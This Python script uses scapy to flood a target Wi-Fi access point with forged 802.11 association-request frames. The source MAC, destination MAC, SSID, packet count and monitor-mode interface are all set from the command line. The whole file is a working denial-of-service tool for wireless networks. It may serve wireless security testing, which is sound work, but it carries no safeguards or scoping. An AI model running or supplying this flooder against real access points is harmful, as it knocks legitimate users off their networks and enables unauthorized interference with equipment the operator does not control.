from scapy.all import *
import argparse
import sys


class Flooder:
    subtypes = {
        "assocReq": 0,
        "reassocReq": 2,
    }

    def __init__(self, args):
        actions = {
            "assocReq": self.assocReqSender,
        }

        self.source_addr = args["source_address"]
        self.dest_addr = args["destination_address"]
        self.packet_type = args["packet_type"]
        self.dot11 = Dot11(
                        type = 0,
                        subtype = self.subtypes[self.packet_type],
                        addr1 = self.dest_addr,
                        addr2 = self.source_addr,
                        addr3 = self.dest_addr
                    )
        self.count = args["count"]
        self.interface = args["interface"]
        self.ssid = args['ssid'] if args['ssid'] else None

        func = actions[self.packet_type]
        func()
        
    def assocReqSender(self):
        dot11elt_1 = Dot11Elt(ID='SSID', info=self.ssid)
        dot11elt_2 = Dot11Elt(ID='Rates', info="\x82\x84\x0b\x16")
        
        frame = RadioTap()/self.dot11/Dot11AssoReq()/dot11elt_1/dot11elt_2    
        sendp(frame, iface=self.interface, count=self.count)



        


if __name__ == '__main__':
    argparser = argparse.ArgumentParser(description='Flood 802.11 packets.')
    argparser.add_argument("-src", "--source_address", help="Source MAC address of the packet: '00:00:00:00:00:00' ", required=True)
    argparser.add_argument("-dst", "--destination_address", help="Destination MAC address of the packet: '11:11:11:11:11:11", required=True)
    argparser.add_argument("-p", "--packet_type", help="Type of the 802.11 packet.", choices=["assocReq"],required=True)
    argparser.add_argument("-c", "--count", help="Number of packets to sent.", default=1, type=int)
    argparser.add_argument("-i", "--interface", help="Interface (must be in monitor mode).", required=True)
    argparser.add_argument("-ssid", "--ssid", help="(AssocReq) SSID of target AP: 'aristaSSID' ")


    if 'assocReq' in vars(argparser.parse_args()).values() and not vars(argparser.parse_args())["ssid"]:
        print("'-ssid/--ssid' parameter required for assocReq option.")
        sys.exit()

    args = vars(argparser.parse_args())
    
    flooder = Flooder(args)  